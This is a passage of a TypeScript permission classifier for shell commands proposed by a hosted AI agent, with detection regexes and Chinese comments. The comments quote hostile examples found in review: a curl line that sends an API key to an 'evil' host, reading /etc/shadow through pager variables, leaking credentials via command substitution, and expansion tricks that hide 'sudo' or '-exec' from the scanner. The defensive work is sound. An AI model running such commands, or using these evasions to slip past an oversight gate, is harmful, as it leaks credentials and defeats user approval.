import {
  isDotenvCredentialPath,
  isSensitiveCredentialPath,
  SENSITIVE_CREDENTIAL_GLOB_PATTERNS,
  SENSITIVE_CREDENTIAL_PATH_PATTERNS,
} from './hosted-agent-credential-paths.js';

import { parseShellInputRedirections } from './hosted-agent-shell-input-redirections.js';


export type ReviewVerdict = 'auto-approve' | 'prompt' | 'prompt-each-time';

export const MAX_AUTO_REVIEW_ACTION_TEXT_CHARS = 4_096;


// ─────────────────────────── shell 命令分类 ───────────────────────────

/**
 * 明确只读的 shell 命令(basename)。放行前提:命令本身不写文件/不改状态,且 argv 无输出
 * 重定向、命令替换、危险 flag。
 */
// 注意:`env`/`printenv` 不在此列 —— 裸调用会把整个进程环境(含注入子进程的 provider
// API key,见 env-builder)dump 给模型,是凭证外泄面,不能静默放行。`env VAR=x cmd` 作为
// 包裹器仍会剥壳按内层命令判定(见 COMMAND_WRAPPERS);裸 `env` 剥壳后为空段→fail-closed 升级。
// `cat`/`grep`/`base64` 等能读文件的仍在列,但读**凭证文件**由 ALWAYS_ASK_PATTERNS 先行拦成
// prompt-each-time(在 classifyShellCommand 里先于分段判定),读普通文件才放行。
const SAFE_READONLY_BINS: ReadonlySet<string> = new Set([
  'ls', 'pwd', 'echo', 'cat', 'head', 'tail', 'wc', 'stat', 'file', 'which',
  'type', 'date', 'whoami', 'hostname', 'uname', 'basename', 'dirname',
  'realpath', 'readlink', 'true', 'false', 'test', 'id', 'tty',
  'grep', 'egrep', 'fgrep', 'rg', 'ag', 'find', 'tree', 'du', 'df', 'ps',
  'diff', 'cmp', 'sort', 'uniq', 'cut', 'tr', 'column', 'nl', 'tac',
  'jq', 'yq', 'base64', 'md5', 'md5sum', 'sha256sum', 'cksum',
]);


/** Read-only commands whose positional operands may expose file contents. */
const DOTENV_FILE_READER_BINS: ReadonlySet<string> = new Set([
  'cat', 'head', 'tail', 'wc', 'stat', 'file', 'realpath', 'readlink',
  'grep', 'egrep', 'fgrep', 'rg', 'ag', 'find', 'tree', 'du',
  'diff', 'cmp', 'sort', 'uniq', 'cut', 'tr', 'column', 'nl', 'tac',
  'jq', 'yq', 'base64', 'md5', 'md5sum', 'sha256sum', 'cksum', 'sed', 'date',
]);



/** 命令包裹器:剥掉后信任绑定到内层真实命令。`sudo`/`doas` 不在此列(提权本身危险)。 */
const COMMAND_WRAPPERS: ReadonlySet<string> = new Set([
  'env', 'nohup', 'nice', 'ionice', 'stdbuf', 'timeout', 'time', 'command', 'builtin',
  'setsid', 'chrt', 'exec', 'watch', 'flock', 'taskset', 'prlimit', 'setarch',
  // 命名空间/权限启动器:`unshare [opts] PROGRAM`、`nsenter [opts] PROGRAM`、`setpriv [opts] PROGRAM`
  // 都会执行后面的程序(codex 报 `unshare -- rm -rf /outside` 只落灰区)。
  'unshare', 'nsenter', 'setpriv',
  // 其余「会执行后面命令」的启动器:script(`-c '<命令串>'` 或 BSD 形态的尾随 argv,codex 报
  // `script -q -c 'rm -rf /outside' /dev/null` 只落灰区)、sg(`sg GROUP -c '<命令串>'`)、
  // unbuffer(expect 的透明包装)、busybox(applet 多路复用器)、macOS 的 arch / caffeinate。
  'script', 'sg', 'unbuffer', 'busybox', 'arch', 'caffeinate',
]);


/**
 * PowerShell 里指定写目标的具名参数(大小写无关,支持唯一前缀缩写如 `-Dest`)。
 * `-LP` / `-PSPath` 是 `-LiteralPath` 的**文档别名**,前缀规则匹配不到,必须显式列出。
 */
const POWERSHELL_TARGET_PARAMS: readonly string[] = [
  '-path', '-literalpath', '-lp', '-pspath', '-destination', '-filepath', '-newname',
  // 归档 / 转录 / 帮助下载各自的落地位置参数(Compress-Archive、Start-Transcript、Save-Help…)。
  '-destinationpath', '-outputdirectory',
  // 下载落盘位置(Invoke-WebRequest / Invoke-RestMethod)。
  '-outfile',
];


/**
 * `-Path` 这一族(含 `-LiteralPath` 的文档别名)—— 它指目标还是指源**由 cmdlet 决定**:
 * `Set-Content -Path` 是写目标,`Copy-Item -Path` 是读源。见 `pathIsSource`。
 */
const POWERSHELL_PATH_PARAMS: readonly string[] = ['-path', '-literalpath', '-lp', '-pspath'];


/**
 * 写 cmdlet 上**带值**的非目标参数 —— 必须把值一并消费,否则值会被当成位置操作数、顶掉真正的
 * 写目标:`Set-Content -ErrorVariable errs C:\Windows\…\hosts owned` 会把 `errs` 当目标,系统
 * 路径反而漏掉(codex 报,已实测)。
 *
 * 第一组是 about_CommonParameters 里**每个 cmdlet 都有**的带值通用参数(含官方短别名 —— `-ea`
 * 这类别名不是前缀,前缀规则匹配不到,必须逐个列)。第二组是这些写/删除 cmdlet 自己的带值参数。
 */
const POWERSHELL_COMMON_VALUE_PARAMS: readonly string[] = [
  // about_CommonParameters 里带值的参数(含官方短别名)。路径枚举器也复用这张表消费参数值,
  // 避免 `Resolve-Path -ErrorAction Stop` 把 `Stop` 冒充成枚举出来的路径。
  '-erroraction', '-ea', '-warningaction', '-wa', '-informationaction', '-ia', '-infa',
  '-progressaction', '-proga', '-errorvariable', '-ev', '-warningvariable', '-wv',
  '-informationvariable', '-iv', '-outvariable', '-ov', '-outbuffer', '-ob',
  '-pipelinevariable', '-pv',
];


const POWERSHELL_VALUE_PARAMS: readonly string[] = [
  ...POWERSHELL_COMMON_VALUE_PARAMS,
  // cmdlet 自己的带值参数。
  '-encoding', '-value', '-itemtype', '-name', '-filter', '-include', '-exclude',
  '-width', '-delimiter', '-stream', '-credential', '-type', '-propertytype',
  '-fromsession', '-tosession', '-totalcount', '-tail',
  // 位置 cmdlet(Set-Location / Push-Location / Pop-Location)的具名栈。带值,必须消费 —— 不消费的话
  // `Push-Location -StackName foo -Path <系统目录>` 会把 `foo` 当成新 cwd,真正的 -Path 反而没被看
  // (codex 报)。
  '-stackname',
  // Set-Acl 的 ACL 对象:不是写目标,但**带值** —— 不消费的话值会被当位置操作数、顶掉真目标。
  '-aclobject', '-securitydescriptor', '-centralaccesspolicy',
  // Export-* / 归档族自己的带值参数。同一个道理:`Export-Csv -InputObject $x -Path <系统路径>`
  // 若不消费 `$x`,它会被当成位置操作数顶掉 `-Path`(这是本表第三次踩同一个坑,前两次是
  // `-Encoding` 与 `-AclObject`,所以登记新 cmdlet 时一并登记它的带值参数已是固定动作)。
  // Set-AuthenticodeSignature 自己的带值参数(登记新 cmdlet 时一并登记带值参数,同上)。
  '-includechain', '-hashalgorithm', '-timestampserver', '-sourcepathorextension', '-content',
  '-inputobject', '-cert', '-certificate', '-module', '-compressionlevel', '-password',
  '-usequotes', '-quotefields', '-usiculture', '-fullyqualifiedmodule',
  // Invoke-WebRequest / Invoke-RestMethod 的带值参数。这一组必须齐,否则未知参数会触发下面
  // 「操作数顺序不可证」的 fail closed,把 `iwr <url> -Headers $h` 这种日常调用打成硬弹窗。
  '-uri', '-method', '-headers', '-body', '-contenttype', '-useragent', '-timeoutsec',
  '-maximumredirection', '-maximumretrycount', '-retryintervalsec', '-proxy',
  '-proxycredential', '-sessionvariable', '-websession', '-form', '-infile',
  '-transferencoding', '-authentication', '-token', '-certificatethumbprint',
  '-statuscodevariable', '-responseheadersvariable', '-connectiontimeoutseconds',
  '-operationtimeoutseconds', '-httpversion',
];


/**
 * **开关**参数(不带值)。列出来的意义不是"跳过它们"——不列也会跳过——而是把「未知参数」
 * 缩小到真的未知:未知参数**可能**吃掉下一个 token,一旦吃掉,后面的位置操作数就整体错位、
 * 真正的写目标被顶掉而静默降级(codex 报)。所以判据是:
 *   已知开关 → 确定不吃值,位置照常算;
 *   未知 / 前缀歧义 + 下一个 token 不是 `-` 开头 → **无法证明**操作数没错位 → fail closed。
 * fail closed 的做法是把**全部**操作数都当写目标(见 powerShellWriteTargets),而不是直接判
 * 不可证:后者会把 `Set-Content -Junk v C:\repo\a.txt hi` 这种区内写也打成硬弹窗;前者
 * 只可能多问(把源/属性名也算进去),不可能漏掉真目标。
 */
const POWERSHELL_SWITCH_PARAMS: readonly string[] = [
  // 通用参数里的开关(含官方短别名)。
  '-verbose', '-vb', '-debug', '-db', '-whatif', '-wi', '-confirm', '-cf',
  // 写 / 删除 cmdlet 自己的开关。
  '-force', '-recurse', '-passthru', '-nonewline', '-noclobber', '-append', '-container',
  '-usetransaction', '-asbytestream', '-raw', '-wait', '-followsymlink', '-nooverwrite',
  '-notypeinformation', '-nonewwindow',
  // Invoke-WebRequest / Invoke-RestMethod 的开关(同上:列出来才能把「未知参数」缩小到真的未知)。
  '-usebasicparsing', '-usedefaultcredentials', '-skipcertificatecheck', '-skiphttperrorcheck',
  '-skipheadervalidation', '-allowunencryptedauthentication', '-noproxy', '-resume',
  '-preserveauthorizationonredirect', '-disablekeepalive', '-allowinsecureredirect',
];


/**
 * 无法由主 Agent 换安全做法绕开的高影响同意边界。命中才 `prompt-each-time`：
 * 提权 / 系统与磁盘控制 / 凭证访问 / fork bomb / 全局权限放宽。
 */
/**
 * 把「结构上确定是数据」的引号字面量替换成占位符,供确定性红线扫描使用。
 *
 * 背景:`ALWAYS_ASK_PATTERNS` 是在**整条命令去引号后**的字符串上扫的 —— 引号内的散文
 * 因此被当代码看。实机语料里剩余红线的绝大多数由此产生,而且全是误报:
 *   - `B1="……永久 link-close(收到对端 user/toggle-off/shutdown/revoked……)"`
 *     —— PR 回复正文里的 `shutdown` 是一个**枚举值的名字**,被当成关机命令;
 *   - `git commit -m "fix: …… 清理 ……"` —— 中文提交说明整段被当命令扫;
 *   - `git diff --name-only | grep -E "\.env|\.pem|credential|secret"`
 *     —— 这条命令的用途正是**阻止**把凭证提交上去,却因为 pattern 里写了这些词
 *     被判成「读凭证文件」。
 *
 * 只剥三类**结构上**可判定的数据位,不做「看起来像散文」这种启发式:
 *   1. 纯变量赋值的值(`NAME='…'` / `NAME="…"`);
 *   2. 消息**正文**类 flag 的值(`-m` / `--message` / `--body` / `--title`);
 *   3. grep 家族的搜索模式(要**找**的正则,不是要读的路径)。
 *
 * ## 两道安全护栏(缺一就是凭证绕过,review P1 实证)
 *
 * **护栏一:凭证路径永不被抹掉。** 第 1、2 类的值**可能是一个路径**,一旦抹掉,
 * 「读凭证文件」这条红线就查不到证据。实证形态:
 *
 *     git commit -F "/home/user/.ssh/id_rsa"       ← 加引号 = 灰区(错)
 *     git commit -F /home/user/.ssh/id_rsa         ← 不加引号 = 红线(对)
 *
 * 只差一对引号结论就反了。所以这两类走 `maskUnlessCredential`:字面量命中
 * `isSensitiveCredentialPath` 时**原样保留**,让后面的 ALWAYS_ASK 照常命中。
 * 第 3 类不加这道护栏 —— grep 的模式串结构上是「要找什么」,不是「要读哪个文件」,
 * 它要读的文件是后面的操作数,那些从不参与本函数的替换(所以
 * `grep -E "\.env|\.pem" ~/.ssh/id_rsa` 里的凭证路径仍然可见)。
 *
 * **护栏二:`-F` 不是消息正文 flag。** `git commit -F` 是 `--file`、
 * `gh issue create -F` 是 `--body-file` —— 两个都是**从文件读正文**,值是路径。
 * 把它当文案抹掉就是上面那条 P1 的直接成因。同理,`--body-file` / `--message-file`
 * 一律不进这张表;进表的只有值**就是正文本身**的 flag。
 *
 * **执行面不在这条链路上**:`sh -c "…"`、`eval "…"`、管道到解释器都由更前面的
 * `highImpactExecutionNeedsConsent` 判定(它按引号外的真实执行结构分析,不读本函数
 * 的产物)。这里剥掉的只是纯字符串实参。
 */
/**
 * grep 家族里「值是**要启动的外部程序**」的选项:rg 的 `--pre COMMAND` /
 * `--hostname-bin PROG`、ag 的 `--pager COMMAND`。这些位置的值不是搜索模式,抹成 DATA
 * 就把执行证据抹没了 —— 而这几个工具又都在只读白名单里,结果是**直接放行**(review 报:
 * `ag --pager "sudo cat /etc/shadow" foo .` 实测由确定性必问降成了 auto-approve)。
 *
 * 只登记**真实存在且已实测**的选项。不按臆想的命名惯例预扩(`*-bin`/`*-cmd` 之类)——
 * 保留字面量是 fail-closed 方向,凭空放宽会把普通 grep/rg 命令误报成红线。
 */
const RG_EXECUTABLE_OPTIONS = /(?:^|\s)--(?:pre|pager|hostname-bin)$/;


function stripDataLiterals(command: string): string {
  const QUOTED = String.raw`(?:"[^"]*"|'[^']*')`;
  /**
   * 抹成占位符,但两种情况原样留下:
   *  - **凭证路径**:值可能是一个路径,抹了红线就失去证据(护栏一);
   *  - **含 `$` 展开或命令替换的双引号值**:双引号里的 `$(…)` / 反引号 / `<(…)` **会执行**,
   *    `$VAR` / `${VAR}` **会展开**,都不是纯数据:
   *      · `git commit -m "$(cat ~/.aws/credentials)"` 把凭证明文写进 commit,抹掉整个值
   *        会让替换体里的凭证路径消失(替换体的递归检查只查执行类红线,不查凭证路径);
   *      · `git commit -m "$GITHUB_TOKEN"` 同理 —— 敏感环境变量名是后面红线的判据,
   *        抹成 DATA 之后那条正则什么也看不到(review 二轮 P1)。
   *    单引号里这些不生效,但这里不区分引号种类:多留几个字面量进扫描面是 fail-closed
   *    方向,代价只是极少数误报(含 `$` 的散文不再被剥离)。
   */
  // `>(…)`(输出进程替换)与 `<(…)` 同样在双引号内**执行**,漏了它等于给一个换方向就
  // 绕过的口子(review 报)。
  const EXECUTABLE_INSIDE_QUOTES = /\$|`|<\(|>\(/;
  const maskUnlessCredential = (prefix: string, literal: string): string => (
    isSensitiveCredentialPath(literal) || EXECUTABLE_INSIDE_QUOTES.test(literal)
      ? `${prefix}${literal}`
      : `${prefix}DATA`
  );
  return command
    // 1) NAME='…' / NAME="…" —— 赋值的右值是数据(除非它是凭证路径)。
    .replace(
      new RegExp(String.raw`(^|[\s;&|(])([A-Za-z_]\w*)=(${QUOTED})`, 'g'),
      (_m, sep: string, name: string, literal: string) => {
        // 同一条命令里若之后又把这个变量**展开**出来(`CMD="sudo"; $CMD cat /etc/shadow`),
        // 那个值就不是纯数据 —— shell 会把它展开成真实命令,遮蔽后红线只看到 `$CMD`。
        // 被引用就整段保留给红线扫描(review 报:字面 `sudo` 原本逐次确认,遮蔽后降灰区)。
        const referenced = new RegExp(String.raw`\$\{?${name}\b`).test(command);
        if (referenced) return `${sep}${name}=${literal}`;
        // 通过**环境隐式**交给子进程执行的赋值同样不是数据:`GIT_PAGER="sudo …" git log`
        // 里没有任何 `$GIT_PAGER` 展开,git 却会真的把它当程序启动(review 报)。
        if (ENV_EXECUTION_NAME.test(name)) return `${sep}${name}=${literal}`;
        return maskUnlessCredential(`${sep}${name}=`, literal);
      },
    )
    // 2) 消息**正文**类 flag 的值。只收「值就是正文」的 flag:`-F`/`--body-file`/
    //    `--message-file` 的值是**路径**,不在此列(见上方护栏二)。
    .replace(
      new RegExp(String.raw`(\s(?:-m|--message|--body|--title)(?:=|\s+))(${QUOTED})`, 'g'),
      (_m, prefix: string, literal: string) => maskUnlessCredential(prefix, literal),
    )
    // 3) grep 家族的搜索模式:要找的正则,不是要读的文件。要读的文件是后面的操作数,
    //    不参与替换,所以这里不需要凭证护栏(加了反而会让「扫描凭证特征」的命令重新误报)。
    //
    //    **但 `-f`/`--file` 是例外**:那个位置的值是「模式文件的路径」,不是模式本身。
    //    `grep -f "~/.ssh/id_rsa" package.json` 抹掉之后凭证路径消失,而 grep 又在只读
    //    白名单里 → 整条变成 auto-approve;同一路径不加引号却仍必问(review 三轮 P1)。
    //    紧贴的短选项簇(`-nf`)同样以 `f` 结尾吃下一个参数,一并识别。
    .replace(
      new RegExp(String.raw`(\b(?:grep|egrep|fgrep|rg|ag)\b(?:\s+-{1,2}[\w-]+(?:=\S+)?)*\s+)(${QUOTED})`, 'g'),
      (_m, prefix: string, literal: string) => (
        // `-f`/`--file` 位置的值是模式**文件路径**;含 `$`/命令替换的模式是**动态值**——
        // `grep "$(cat ~/.aws/credentials)" f` 会真的读凭证、`grep "$GITHUB_TOKEN" f` 会把
        // 令牌摊到命令行。两类都必须原样留给红线扫描(review P1)。
        // 不加「静态凭证路径」护栏:模式位是「要找什么」,不是「读哪个文件」(要读的文件是
        // 后面的操作数,从不参与替换),加了会让 `grep -E "\.env|\.pem|credential"` 这条
        // **防止**凭证误提交的扫描命令重新误报成红线。
        // 文件型选项统一按「后面那个值是**被读取的路径**」处理:`-f`/`--file`(模式文件)、
        // `--exclude-from`/`--include-from`(grep 的排除/包含清单)、`--ignore-file`(rg)。
        // 判据取「以 file / from 结尾的长选项」+ 以 f 结尾的短选项簇,一次覆盖同族,
        // 不逐个登记(review 五轮 P1:`grep --exclude-from "~/.ssh/id_rsa" foo src`
        // 原来整条是 auto-approve)。
        /(?:^|\s)(?:-[a-zA-Z]*f|--[\w-]*(?:file|from))$/.test(prefix.trimEnd())
          // rg 的 `--pre` / `--hostname-bin`:值是**要启动的外部程序**,不是搜索模式。
          // 与文件型选项同理,抹成 DATA 就把执行证据抹没了(review 报)。
          || RG_EXECUTABLE_OPTIONS.test(prefix.trimEnd())
          || EXECUTABLE_INSIDE_QUOTES.test(literal)
          ? `${prefix}${literal}`
          : `${prefix}DATA`
      ),
    );
}


type CommandScanPattern = Pick<RegExp, 'test'>;


function ghAuthShowsToken(command: string): boolean {
  // A slash also establishes a command boundary for /usr/bin/gh and ./gh.
  // Avoid rescanning an arbitrary path prefix from every shell separator.
  const heads = /(?:^|[\s|&;(\/])gh\s+auth\s+[a-z][\w-]*/g;
  const boundary = /[|;&\n]/g;
  // Sticky: scan the suffix only from the first auth head in each segment.
  // Keep --show-token[=value], -t/-wt/-tw[=value] and separator boundaries.
  // The lookahead makes the short-option letter run linear even for a long
  // cluster containing many t's followed by an invalid trailing '-'.
  const flags = /[^|;&\n]*?\s(?:--show-token(?:$|[\s=|&;)])|-(?=[a-zA-Z]*t)[a-zA-Z]+(?:=[^\s|;&]*)?(?![\w-]))/y;
  let scannedUntil = -1;
  let head: RegExpExecArray | null;
  while ((head = heads.exec(command))) {
    const argsStart = heads.lastIndex;
    // Preserve overlapping heads and heads whose whitespace spans a newline.
    // Only a head ending beyond the already-scanned segment needs another scan.
    heads.lastIndex = head.index + 1;
    if (argsStart <= scannedUntil) continue;
    flags.lastIndex = argsStart;
    if (flags.test(command)) return true;
    boundary.lastIndex = argsStart;
    scannedUntil = boundary.exec(command)?.index ?? command.length;
  }
  return false;
}


/**
 * 读取或打出可复用凭证的确定性红线(ALWAYS_ASK_PATTERNS 的子集)。单独成表：供应商分享的受邀者
 * 任务在完全访问下也要确认这一类(shellCommandReadsCredentials)。
 */
const CREDENTIAL_ALWAYS_ASK_PATTERNS: readonly CommandScanPattern[] = [
  // Token flags belong to gh auth only: echo/grep --show-token and docker -t
  // must not become credential prompts. Use the same scanner in both gates.
  { test: ghAuthShowsToken },
  // `gh auth token` directly prints a reusable credential.
  /(?:^|[\s|&;(\/])gh\s+auth\s+token\b/,
  ...SENSITIVE_CREDENTIAL_PATH_PATTERNS,                  // 凭证/密钥路径(见上)
  /\bsecurity\s+(?:find|dump|export|add)-/,               // macOS keychain
  /\$\{?[A-Za-z0-9_]*(?:KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|APIKEY|_PAT)[A-Za-z0-9_]*\}?/i, // 敏感环境变量展开(echo "$API_KEY" 等)
];


/**
 * 高风险但通常可由主 Agent 换一条安全做法的动作。它们进入当前模型 reviewer，而不是
 * 直接打断用户：reviewer 可 allow（明确、范围受控）、block（让 Agent 重试）或只在确实
 * 跨越高影响边界时 ask。
 */
/**
 * 值会被下游命令**当程序执行 / 解释**的环境变量名。两个消费者共用这一份口径:
 *  - `REVIEW_REQUIRED_PATTERNS`:出现这类赋值即不得直接放行;
 *  - `stripDataLiterals`:这类赋值的值**不能被遮蔽成 DATA** —— 它就是要执行的命令,
 *    抹掉后红线什么也看不到(`GIT_PAGER="sudo cat /etc/shadow" git --paginate log`
 *    实测由确定性必问降进灰区,review 报)。
 *
 * 两处必须同源:一处认得、另一处认不得,正是「遮蔽把证据抹掉」这类漏判的成因。
 * 分页器 / 编辑器按**整族**登记(`(?:[A-Z][A-Z0-9_]*)?PAGER` / `…EDITOR`):每个 CLI 都有
 * 自己的一份(`GIT_PAGER`、`GH_PAGER`、`GH_EDITOR`、`GIT_SEQUENCE_EDITOR`、`HGEDITOR`…),
 * 逐个登记等于给一个换前缀就绕过的口子。前缀里的下划线也是**可选**的 —— `HGEDITOR`
 * 这种连写形态同样存在。
 */
const ENV_VARS_EXECUTING_THEIR_VALUE = 'LD_PRELOAD|LD_LIBRARY_PATH|LD_AUDIT|DYLD_[A-Z_]+'
  + '|(?:[A-Z][A-Z0-9_]*)?PAGER|GIT_SSH(?:_COMMAND)?|GIT_PROXY_COMMAND|GIT_ALLOW_PROTOCOL'
  // `GIT_CONFIG_VALUE_<n>` 配合 `GIT_CONFIG_KEY_<n>=diff.external`(或 core.pager /
  // sequence.editor …)注入的配置值会被 git 当外部程序启动 —— 不能遮蔽成 DATA,否则
  // `GIT_CONFIG_VALUE_0="sudo …" git diff` 会连红线带审阅一起绕过、直接放行(review 报)。
  + '|GIT_PROTOCOL_FROM_USER|GIT_EXTERNAL_DIFF|GIT_CONFIG_(?:GLOBAL|SYSTEM|VALUE_\\d+)|BASH_ENV'
  + '|PROMPT_COMMAND|PS4|PERL5LIB|PYTHONPATH|PYTHONSTARTUP|PYTHONINSPECT|NODE_OPTIONS'
  // 编辑器族与分页器同理:值是 git / 其它 CLI 会**启动的程序**
  // (`GIT_EDITOR="sudo …" git commit`),不是数据。**按整族登记**,与 PAGER 同写法 ——
  // 每个 CLI 都有自己的 `<TOOL>_EDITOR`(gh 的 `GH_EDITOR`、git 的 `GIT_SEQUENCE_EDITOR`…),
  // 只列 `GIT_` 前缀等于给一个换前缀就绕过的口子(review 报,与 PAGER 那次同一个错误)。
  + '|(?:[A-Z][A-Z0-9_]*)?EDITOR|VISUAL'
  + '|RUBYOPT|PATH';

const ENV_EXECUTION_NAME = new RegExp(`^(?:${ENV_VARS_EXECUTING_THEIR_VALUE})$`);


/** 命令替换 / 进程替换:参数里塞 `$(...)` / 反引号 / `<(...)` / `>(...)`,可绕过静态判定 → 一律升级。 */
const COMMAND_SUBSTITUTION = /\$\(|`|[<>]\(/;


/**
 * 去掉能**嵌进词中间**的 shell 参数展开:花括号形 `${...}` 与位置参数 `$1`(**不含**命令替换 `$(...)`,
 * 那个另有 COMMAND_SUBSTITUTION 拦)。攻击者把未设变量嵌进关键词/flag 中间(`find … -ex${UNSET}ec …`、
 * `rg --pr${UNSET}e=…`、`s${X}udo`),审查时字面不含 `-exec`/`sudo`,bash 展开成空后才成形(codex 报)。
 * 把这类展开抹成空得到的变体一并参与匹配,即可在展开前现形。
 *
 * **只剥 `${...}`/`$N`,不剥裸 `$VAR`**:中间嵌入必须靠花括号或单字符位置参数定界(裸 `$UNSETec` 会被
 * bash 当成变量名 `UNSETec`、无法拼出 `-exec`),故裸 `$VAR` 不构成此绕过;且裸形是 jq 的 `$ENV` 等语义
 * token,抹掉会破坏既有检测。作为**额外变体**叠加(不替换原串),`$API_KEY` 等敏感变量检测仍走原串。
 * `$VAR` 展开成非空值(如指向凭证路径)属静态不可闭合残口(同 DNS 重绑定)。
 */
function stripExpansions(s: string): string {
  return s
    .replace(/\$\{[^}]*\}/g, '') // ${VAR} / ${UNSET}
    .replace(/\$\d+/g, '');      // $1 位置参数(单字符,可无花括号嵌入词中)
}


/**
 * 带**运算符/替换文本**的花括号展开:`${X:-ec}`(默认值)、`${X:+y}`(替代值)、`${X/a/b}`(替换)、
 * `${X#p}`/`${X%s}`(裁剪)等。stripExpansions 把整段抹成空,会漏掉替换文本 —— `-ex${UNSET:-ec}` 抹空后
 * 是 `-ex`,但 bash 代入默认值 `ec` 拼成 `-exec`(codex 报)。这类展开静态不可求值,出现在"本要放行"的段里
 * 一律升级。纯变量名 `${VAR}`(无运算符)不匹配 —— 那个由 stripExpansions 的空值变体处理,值注入属残口。
 */
const SUBSTITUTION_EXPANSION = /\$\{[^}]*[-+=:?/#%^,!*@][^}]*\}/;


/**
 * bash 花括号展开:列表 `{a,b}` 或序列 `{x..y}`。**在分词前**展开,故能把关键词/flag 拆开
 * (`-ex{e..e}c`→`-exec`、`s{u..u}do`→`sudo`,codex 报),静态不可预测其展开结果。需含逗号或 `..`
 * 才是展开(find 占位符 `{}`、`{foo}` 不是)。仅当它出现在**命令名或 flag**里才升级(位置参数里的
 * `ls a/{b,c}` 只影响文件名,不升级;curl URL glob 另由 isSafeFetch 处理)。
 */
const BRACE_EXPANSION = /\{[^}]*(?:,|\.\.)[^}]*\}/;


/**
 * 把带默认/替代值的展开代入其文本,得到"展开后可能的形态":`${UNSET:-ec}`→`ec`、`${X:=sudo}`→`sudo`。
 * 供危险模式扫描,让藏在默认值里的危险关键词(sudo/rm 等)也现形。只抽 `:-`/`:=`/`:+`/`-`/`+`/`=` 后的文本。
 */
function substituteDefaults(s: string): string {
  return s.replace(/\$\{[A-Za-z0-9_]*:?[-+=]([^}]*)\}/g, '$1');
}


/**
 * 文件输出重定向 `>` / `>>`。凡 `>`/`>>` 且其后不是 `&` → 写文件(命中);`>` 后是 `&`(`2>&1`/`>&2` fd
 * 复制)→ 不命中。唯一前置排除是 `-`(避免 `a->b` 箭头误判)—— 数字/字母/`&` 在前都算写:`1>file`、
 * `payload2>~/.bashrc`(codex 报的数字结尾词)、`&>out`(stdout+stderr 合并写)全命中。
 * 调用方在**去掉引号内容**的串上匹配(引号内的 `>` 是数据不是重定向,见 classifyShellSegment)。
 */
const OUTPUT_REDIRECTION = /(?<!-)>>?(?!&)/;


/**
 * curl/wget 视为"只读取回"(命令行浏览器)的排除项。命中任一就不是安全 GET,交通用判定升级:
 *   - **上传数据 / 非 GET 方法**:外发内容(exfil 面)。
 *   - **落盘到文件**(`-o`/`-O`/`--output`):把远端内容写进任意路径(可覆盖 `~/.ssh/authorized_keys`
 *     等敏感文件)—— 与 shell 重定向同样是"写任意路径",必须升级。`curl URL`(默认 stdout)才放行。
 */
// curl 上传 / 非 GET 方法。含贴合式短选项(`-dDATA` / `-Ffield` / `-Tfile`)——`-[dFT]` 不带 \b,
// 贴合的 value 照样命中。大小写敏感(不加 /i):`-d/-F/-T` 是上传,`-D`(dump-header,只读)不能误伤。
// `-[a-zA-Z]*[dFT]`:短选项簇里含值取向的 -d/-F/-T(curl 无布尔短选项用 d/F/T),捕获贴合 `-dDATA`、
// 捆绑 `-sdsecret`、独立 `-d`;curl 大小写敏感,不误伤只读的 -D。
const CURL_UPLOAD_FLAGS = /(?:^|\s)-[a-zA-Z]*[dFT]|(?:^|\s)--(?:data|form|upload-file|json|url-query)[\w-]*/;

// 非 GET 方法(-X/--request POST 等)单列且**大小写不敏感**:curl 接受小写 `-X post` / `--request post`。
// 不能给上面的短选项簇整体加 /i —— 那会让 `[dFT]` 匹配到只读的 -f/-D,把 `curl -f` 误判成上传。
const CURL_NONGET_METHOD = /(?:^|\s)(?:-X|--request)[=\s]*(?:POST|PUT|DELETE|PATCH)\b/i;

// 落盘到文件/目录(curl -o/-O/-D/--output;wget -o 日志 /-O 文档 /-P 目录前缀)。写任意路径。
// 短选项用簇匹配 `-[a-zA-Z]*[oODP]`:除贴合 `-ofile`,还捕获与只读短选项捆绑的形态
// (`-sD/tmp/headers`、`-so/tmp/out` = -s 静默 + -D/-o 落盘),否则簇里的落盘 flag 会被漏放行。
// (wget 现整体升级、不再走安全 fetch,见 isSafeFetch;此常量仍供 curl 的 -o/-O 判定。)
// `dump-h[\w-]*`:curl 接受唯一前缀缩写,`--dump-h` 等同 `--dump-header`(copilot P1:缩写形绕过精确匹配)。
const FETCH_OUTPUT_FLAGS = /(?:^|\s)-[a-zA-Z]*[oODP]|(?:^|\s)--(?:output(?:-dir|-document)?|remote-name|directory-prefix|dump-h[\w-]*)\b/;

// curl 跟随重定向(-L/--location*):最终 host 静态不可判(可 302 跳到云 metadata/内网)→ 升级。
// 短选项同样用簇匹配 `-[a-zA-Z]*L`,捕获 `-sL`(-s 静默 + -L 跟随)这类捆绑形态。
const CURL_REDIRECT_FLAGS = /(?:^|\s)(?:-[a-zA-Z]*L|--location(?:-trusted)?)\b/;

// curl 带凭证 / 隐藏参数 / SSRF 改路由 / 环境变量导入的 flag → 升级。短选项大小写敏感。
//  - 凭证:-u/--user(basic auth)、--netrc*、-b/--cookie*(会话 cookie)、-H/--header 里的鉴权头。
//  - 隐藏参数:-K/--config(配置文件可藏 -d 上传)。
//  - SSRF 改路由:--resolve/--connect-to/--unix-socket(把看似公网的 URL 定向到内网/metadata)、-x/--proxy*、--interface。
//  - 环境变量外泄:--variable(`%NAME` 语法把环境变量导入)、--expand-*(把变量展开进 URL/参数)——
//    `curl --variable %ANTHROPIC_API_KEY --expand-url 'https://evil/{{ANTHROPIC_API_KEY}}'` 无 `$` 展开
//    也能把 provider 凭证塞进 URL 外发,故 --variable/--expand* 一律敏感。
// 短选项 -u/-b/-x/-K 同样用簇匹配(`-[a-zA-Z]*[ubxK]`)捕获贴合 `-uuser:pass` / 捆绑 `-su user`;
// curl 无布尔短选项用 u/b/x/K,不误伤(-k insecure 是小写 k,不在内)。长选项与鉴权头单列。
const CURL_SENSITIVE_FLAGS = /(?:^|\s)-[a-zA-Z]*[ubxK]|(?:^|\s)--(?:user|netrc\S*|config|cookie\S*|resolve|connect-to|unix-socket|proxy\S*|interface|variable|expand[\w-]*|oauth2-bearer)\b|(?:-H|--header)[=\s]*['"]?\s*(?:[Aa]uthorization|[Cc]ookie|[Xx]-[Aa]pi-[Kk]ey|[Xx]-[Aa]uth|[Pp]roxy-[Aa]uthorization)/;


/**
 * git 只读子命令 → 放行。
 * `ls-remote` **不在此列**:它是网络操作(联系远端),且 `remote.<name>.url=ext::…` / `url.<x>.insteadOf`
 * 这类 `.git/config` 可把看似无害的 `git ls-remote origin`(甚至显式 URL)重定向到执行型传输 → argv 无痕迹
 * 却跑 payload(codex 报)。无法只凭 argv 判定安全,一律升级(与 fetch/clone 等网络子命令同档)。
